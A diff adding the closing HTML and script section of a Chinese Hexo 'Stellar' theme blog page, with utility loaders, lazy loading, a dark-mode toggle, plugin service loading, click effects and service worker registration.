+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
